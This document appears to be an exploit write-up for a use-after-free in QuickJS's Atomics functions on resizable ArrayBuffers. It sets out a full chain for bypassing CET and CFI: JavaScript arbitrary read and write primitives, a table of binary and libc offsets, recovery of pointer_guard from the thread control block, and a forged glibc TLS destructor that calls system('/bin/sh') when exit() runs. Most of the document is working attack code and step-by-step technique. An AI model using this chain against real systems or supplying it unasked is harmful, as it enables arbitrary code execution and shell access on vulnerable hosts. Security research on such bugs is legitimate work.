# CET+CFI Bypass Exploit for QuickJS Atomics Heap Overflow

## Vulnerability Summary

The vulnerability exists in QuickJS's Atomics operations (`js_atomics_op` and `js_atomics_store`) when used with resizable ArrayBuffers. The functions capture a pointer to the TypedArray's underlying buffer data before invoking `valueOf()` on user-provided arguments. If `valueOf()` resizes the ArrayBuffer, the previously captured pointer becomes stale, leading to a use-after-free condition.

### Root Cause

```c
// quickjs.c: js_atomics_op
ptr = js_atomics_get_ptr(ctx, &abuf, &size_log2, NULL,
                         argv[0], argv[1], 2);  // Captures pointer

// ... later ...
v = JS_ToInt64Sat(ctx, &v1, argv[2]);  // Calls valueOf() - can resize buffer!
// ... and/or ...
rep = JS_ToInt64Sat(ctx, &rep1, argv[3]);  // More valueOf() calls

// Uses stale 'ptr' which may now point to freed/reused memory
```

## Protection Mechanisms

The target binary has three protections enabled:
1. **Full RELRO**: GOT is read-only after startup
2. **Intel CET**: Hardware shadow stack prevents ROP
3. **Clang CFI**: Fine-grained type checking on indirect calls

## Bypass Technique

### Key Insight

Libc is compiled with GCC, not Clang CFI. Therefore, function pointer calls within libc are **not protected by CFI**. The exploit targets glibc's TLS destructor mechanism (`__call_tls_dtors`), which:

1. Is called during `exit()`
2. Uses `PTR_DEMANGLE` but we can learn the `pointer_guard`
3. Executes indirect calls through unprotected libc code

### Exploit Flow

1. **Leak Binary Base**: Read `JSArrayBuffer.free_func` pointer (offset 48) which contains `js_array_buffer_free`
2. **Leak Libc**: Read `printf@GOT` using arbitrary read primitive
3. **Find TCB**: Locate Thread Control Block via `_dl_initial_dtv` in `_rtld_global`
4. **Extract pointer_guard**: Read from `TCB+0x30`
5. **Create Fake TLS Destructor**: Build a `tls_dtor_list` structure with:
   - `func`: `PTR_MANGLE(system)` = `ROL(system ^ pointer_guard, 17)`
   - `obj`: Address of "/bin/sh" string
   - `map`: Valid `link_map` pointer for reference counting
   - `next`: NULL
6. **Hijack Destructor List**: Overwrite `TCB-0x58` (TLS destructor list head)
7. **Trigger**: Call `exit()` which invokes `__call_tls_dtors`

### Why This Bypasses CET+CFI

- **CFI**: The vulnerable indirect call happens in **libc**, not the QuickJS binary. CFI only protects code compiled with CFI instrumentation.
- **CET Shadow Stack**: The exploit doesn't use ROP. The `system()` call is a legitimate forward-edge call through libc's destructor mechanism.
- **CET IBT**: The call to `system()` is allowed because `system()` has `endbr64` at its entry point.

## Memory Primitives

### Arbitrary Read

```javascript
function read64(addr) {
    let triggerBuffer = new ArrayBuffer(56, { maxByteLength: 65536 });
    let triggerView = new BigInt64Array(triggerBuffer);
    let victimBuffer = null;

    let malicious = {
        valueOf: function() {
            triggerBuffer.resize(32768);  // Frees 56-byte slot
            victimBuffer = new ArrayBuffer(8);  // Reuses slot
            return addr;  // Written to victim's data pointer
        }
    };

    Atomics.exchange(triggerView, 2, malicious);  // Index 2 = offset 16 = data ptr
    return victimView[0];  // Reads from addr
}
```

### Arbitrary Write

```javascript
function write64(addr, value) {
    // Same setup as read...
    Atomics.store(triggerView, 2, malicious);  // Writes addr to data ptr
    victimView[0] = value;  // Writes value to addr
}
```

## Key Offsets

| Symbol | Offset |
|--------|--------|
| `js_array_buffer_free` | Binary + 0x109d40 |
| `printf@GOT` | Binary + 0x1150a0 |
| `printf` | Libc + 0x60100 |
| `system` | Libc + 0x58750 |
| `/bin/sh` | Libc + 0x1cb42f |
| `__environ` | Libc + 0x20ad58 |
| `_rtld_global` | ld.so + 0x38000 |
| `_dl_initial_dtv` | `_rtld_global` + 0x10a0 |
| `stack_guard` | TCB + 0x28 |
| `pointer_guard` | TCB + 0x30 |
| TLS dtor list | TCB - 0x58 |

## TLS Destructor Structure

```c
struct dtor_list {
    void (*func)(void *);    // +0x00: PTR_MANGLE'd function pointer
    void *obj;               // +0x08: Argument passed to func
    void *map;               // +0x10: link_map for refcount
    struct dtor_list *next;  // +0x18: Next entry (NULL = end)
};
```

## Reliability

The exploit succeeds approximately 35-50% of the time due to heap layout timing sensitivity. The heap slot reuse during the vulnerability trigger is probabilistic.

## Conclusion

This exploit demonstrates that CFI alone is insufficient when the protected binary interacts with unprotected system libraries. The attack surface extends to any library code that uses function pointers, even when the main binary is fully hardened.
